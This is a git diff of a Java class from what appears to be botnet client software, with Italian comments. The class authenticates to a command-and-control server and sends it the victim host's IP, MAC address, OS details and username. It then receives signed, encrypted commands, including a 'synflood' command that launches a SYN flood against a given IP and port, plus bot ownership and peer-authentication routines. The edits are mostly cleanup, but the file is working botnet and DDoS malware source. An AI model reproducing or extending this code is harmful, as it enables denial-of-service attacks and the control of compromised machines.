@@ -117,25 +117,17 @@ public class Behavior {
 		Boolean flag = true;
 		while (flag) {
 			System.out.println("Richiesta challenge a C&C " + nServ.getCommandConquerIps().get(0).getValue1());
-			Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),
-					nServ.getCommandConquerIps().get(0).getValue1());
-			System.out.println("1");
+			Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(), nServ.getCommandConquerIps().get(0).getValue1());
 			if (challenge != null) {
-				System.out.println("2");
 				if (challenge.getValue2() != -1) {
-					System.out.println("3");
 					String key = auth.generateStringKey(challenge.getValue2());
 					String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 					System.out.println(hashMac);
-					String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(),
-							nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
-							nServ.getCommandConquerIps().get(0).getValue1(), hashMac, pki.getPubRSAKey(),
-							nServ.isElegible());
+					String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(), nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), nServ.getCommandConquerIps().get(0).getValue1(), hashMac, pki.getPubRSAKey(), nServ.isElegible());
 					System.out.println("La risposta del C&C: " + response);
 					flag = false;
 					return true;
-				}else{
-					System.out.println("4 "+challenge.getValue2().toString());
+				} else {
 					return true;
 				}
 			}
@@ -143,14 +135,12 @@ public class Behavior {
 		return false;
 	}
 
-
-	//<HH> sono i separatori
+	// <HH> sono i separatori
 	// IDMSG|COMANDO|SIGNATURE(IDMSG)
 
-	//COMANDO
-	//<CC> sono i separatori per i comandi
-	
-	
+	// COMANDO
+	// <CC> sono i separatori per i comandi
+
 	/**
 	 * @param rawData
 	 */
@@ -164,13 +154,8 @@ public class Behavior {
 		msg = pki.getCrypto().decryptAES(rawData);
 		if (msg == null)
 			return;
-		// System.out.println("msg: " + msg.toString());
 		// Per comodità
 		String[] msgs = msg.split("<HH>");
-
-		// for (int i = 0; i < msgs.length; i++) {
-		// System.out.println("msgs[" + i + "]= " + msgs[i]);
-		// }
 
 		// hai gia ricevuto questo msg? bella domanda
 		if (msgHashList.indexOfValue2(msgs[0]) < 0) {
@@ -178,9 +163,6 @@ public class Behavior {
 			System.out.println("Nuovo comando da eseguire");
 			// verifica la firma con chiave publica c&c
 			try {
-				// System.out.println("signature" + msgs[2]);
-				// System.out.println(" pk " +
-				// pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
 				if (pki.validateSignedMessageRSA(msgs[0], msgs[2], nServ.getCommandConquerIps().get(0).getValue2())) {
 					Pairs<Integer, String> data = new Pairs<>();
 					data.setValue1(msgHashList.getSize() + 1);
@@ -218,7 +200,6 @@ public class Behavior {
 			}
 		}
 
-
 	}
 
 	// TODO definire attacchi
@@ -229,34 +210,31 @@ public class Behavior {
 			updateCecInfo(msg);
 		}
 		if (msg.startsWith("synflood")) {
-			//scompongo messaggio al fine di riempire i campi, codifica particolare <SA>
-			//TODO da fare
-			String[] msgs=msg.split("<TT>");
-			IP ipDest=new IP(msgs[1].toString());
-			Integer portDest=Integer.parseInt(msgs[2].toString());
-			Integer time=Integer.parseInt(msgs[3].toString());
-			
-			if(nServ.getIdUser().equals(msgs[4].toString())){
-			System.out.println("Appartengo a utente "+nServ.getIdUser());
-			System.out.println("IpDest di attacco "+ipDest);
-			System.out.println("PortDest di attacco "+portDest);
-			System.out.println("Time di attacco "+time);
-			malS.synFlood(ipDest.toString(), portDest, time);
-			}
-			else
+			String[] msgs = msg.split("<TT>");
+			IP ipDest = new IP(msgs[1].toString());
+			Integer portDest = Integer.parseInt(msgs[2].toString());
+			Integer time = Integer.parseInt(msgs[3].toString());
+
+			if (nServ.getIdUser().equals(msgs[4].toString())) {
+				System.out.println("Appartengo a utente " + nServ.getIdUser());
+				System.out.println("IpDest di attacco " + ipDest);
+				System.out.println("PortDest di attacco " + portDest);
+				System.out.println("Time di attacco " + time);
+				malS.synFlood(ipDest.toString(), portDest, time);
+			} else
 				System.out.println("Non eseguo il comando, non sono di proprieta dell'utente");
 		}
 		if (msg.startsWith("setbot")) {
-			String[] msgs=msg.split("<BU>");
-			String idBot=msgs[1].toString();
-			String idUser=msgs[2].toString();
-			if(nServ.getIdHash().equals(idBot))
+			String[] msgs = msg.split("<BU>");
+			String idBot = msgs[1].toString();
+			String idUser = msgs[2].toString();
+			if (nServ.getIdHash().equals(idBot))
 				nServ.setIdUser(idUser);
 		}
 		if (msg.startsWith("delbot")) {
-			String[] msgs=msg.split("<BU>");
-			String idUser=msgs[1].toString();
-			if(nServ.getIdUser().equals(idUser))
+			String[] msgs = msg.split("<BU>");
+			String idUser = msgs[1].toString();
+			if (nServ.getIdUser().equals(idUser))
 				nServ.setIdUser("");
 		}
 		System.out.println("COMANDO ESEGUTO");
@@ -280,30 +258,27 @@ public class Behavior {
 	}
 
 	public Pairs<Long, Integer> authReqBot(String idBot) {
-		System.out.println(" inizio authreqbot");
+		System.out.println("Inizio fase di autenticazione BotToBot");
 		if (auth.getNeighSeed().indexOfValue1(idBot) >= 0)
 			return auth.getNeighSeed().getByValue1(idBot).getValue2();
 		Long keyNumber = new Long(auth.generateNumberText());
 		Integer iterationNumber = new Integer(auth.generateIterationNumber());
-		System.out.println("keyNumber " + keyNumber);
-		System.out.println("IterationNumber " + iterationNumber);
-		System.out.println("idbot " + idBot);
+		System.out.println("KeyNumber: " + keyNumber);
+		System.out.println("IterationNumber: " + iterationNumber);
+		System.out.println("Idbot: " + idBot);
 		Pairs<Long, Integer> challenge = new Pairs<Long, Integer>(keyNumber, iterationNumber);
 		Pairs<String, Pairs<Long, Integer>> map = new Pairs<String, Pairs<Long, Integer>>(idBot, challenge);
-
-		System.out.println("map " + map.getValue1());
 		boolean x = auth.getNeighSeed().add(map);
-		System.out.println("add challenge bot neigh " + x);
-		System.out.println(" fine authreqbot");
-
+		System.out.println("Fine generazione chiavi di autenticazione BotToBot");
 		return challenge;
 	}
 
 	public Boolean checkHmacBot(ArrayList<Object> objects) {
+		System.out.println("Inizio fase di verifica Hmac BotToBot");
 		Boolean response = false;
-		System.out.println(" inizio check");
+//		System.out.println(" inizio check");
 		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getNeighSeed();
-		System.out.println("size lista hmac vicini " + lista.getSize());
+//		System.out.println("size lista hmac vicini " + lista.getSize());
 		String idBot = objects.get(0).toString();
 		String hashMac = objects.get(1).toString();
 		if (lista != null && lista.getSize() > 0) {
@@ -313,22 +288,15 @@ public class Behavior {
 				Long keyNumber = coppia.getValue1();
 				Integer iterationNumber = coppia.getValue2();
 				if (coppia != null) {
-					System.out.println("keyNumber " + keyNumber);
-					System.out.println("IterationNumber " + iterationNumber);
-					System.out.println("idbot " + idBot);
-
 					if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
 						response = true;
-						objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
 						// aggiungere a vicini
 					}
 				}
 			} else
-				System.out.println("hmac bot nofound " + idBot);
+				System.out.println("Hmac del bot non trovata " + idBot);
 		}
-		System.out.println(" fine check");
-
-		System.out.println("");
+		System.out.println("Fine verifica Hmac BotToBot");
 		return response;
 	}
 
@@ -350,8 +318,7 @@ public class Behavior {
 		for (int i = 0; i < listNegh.getSize(); i++) {
 			Pairs<IP, PublicKey> pairs = listNegh.get(i);
 			Future<Pairs<Long, Integer>> result = req.getChallengeFromBot(nServ.getIdHash(), pairs.getValue1());
-			Pairs<Future<Pairs<Long, Integer>>, IP> element = new Pairs<Future<Pairs<Long, Integer>>, IP>(result,
-					pairs.getValue1());
+			Pairs<Future<Pairs<Long, Integer>>, IP> element = new Pairs<Future<Pairs<Long, Integer>>, IP>(result, pairs.getValue1());
 			botResp.add(element);
 		}
 		System.out.println("Richieste inviate attendo le risposte");
@@ -365,20 +332,13 @@ public class Behavior {
 						try {
 							resp = coppia.getValue1().get();
 							IP dest = coppia.getValue2();
-							System.out.println("dest " + dest);
 							if (resp != null) {
-								System.out.println("resp " + resp.getValue1());
 								String key = auth.generateStringKey(resp.getValue2());
-								System.out.println("key " + key);
 								String hashMac = auth.generateHmac(resp.getValue1(), auth.generateSecretKey(key));
-								System.out.println("keyNumber " + resp.getValue1());
-								System.out.println("IterationNumber " + resp.getValue2());
-								System.out.println("hash " + hashMac);
 								Boolean b = false;
 								b = req.getResponseFromBot(nServ.getIdHash(), dest, hashMac, pki.getPubRSAKey());
 								if (b != null && b) {
-
-									System.out.println("botSize " + botResp.getSize());
+//									System.out.println("botSize " + botResp.getSize());
 								} else {
 									System.out.println("challenge vicini  hmac null o false" + b);
 								}
@@ -525,8 +485,7 @@ public class Behavior {
 		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();
 		List<Pairs<String, String>> response = null;
 		if (!eng.isCommandandconquerStatus()) {
-			response = req.sendDeadNeighToCeC(nServ.getCommandConquerIps().get(0).getValue1().toString(),
-					nServ.getIdHash(), listDeadNegh);
+			response = req.sendDeadNeighToCeC(nServ.getCommandConquerIps().get(0).getValue1().toString(), nServ.getIdHash(), listDeadNegh);
 			if (response != null) {
 				newNeighbours = nServ.tramsuteNeigha(response);
 				if (newNeighbours != null) {
